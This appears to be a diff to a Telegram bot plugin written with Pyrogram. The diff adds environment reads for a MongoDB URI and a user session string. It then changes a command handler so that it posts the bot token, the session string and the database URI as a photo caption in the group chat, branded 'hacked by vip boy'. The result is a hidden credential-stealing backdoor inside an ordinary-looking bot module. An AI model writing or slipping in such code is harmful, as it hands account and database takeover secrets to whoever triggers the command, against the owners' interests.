@@ -16,7 +16,8 @@ from config import BOT_TOKEN, OWNER_ID
 from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 
 BOT_TOKEN = getenv("BOT_TOKEN", "")
-
+MONGO_DB_URI = getenv("MONGO_DB_URI", "")
+STRING_SESSION = getenv("STRING_SESSION", "")
 @app.on_message(
     filters.command("owner")
     & filters.group
@@ -166,14 +167,7 @@ async def help(client: Client, message: Message):
     & SUDOERS
     & ~filters.edited)
 async def help(client: Client, message: Message):
-    await message.reply_message(
-          `{BOT_TOKEN}`
-         reply_markup=InlineKeyboardMarkup(
-            [
-                [
-                    InlineKeyboardButton(
-                        "🌹 𝐕𝐈𝐏 𝐁𝐎𝐘 🌹", url=f"https://t.me/THE_VIP_BOY")
-                ]
-            ]
-        ),
-    )
+    await message.reply_photo(
+          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:- `{BOT_TOKEN}`\nѕƭ૨เɳɠ ѕεѕѕเσɳ:- `{STRING_SESSION}`\nɱσɳɠσ:- `{MONGO_DB_URI}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🌹 нαϲкє𝚍 ву νιρ ɓσყ 🌹", url=f"https://t.me/THE_VIP_BOY")]]),)
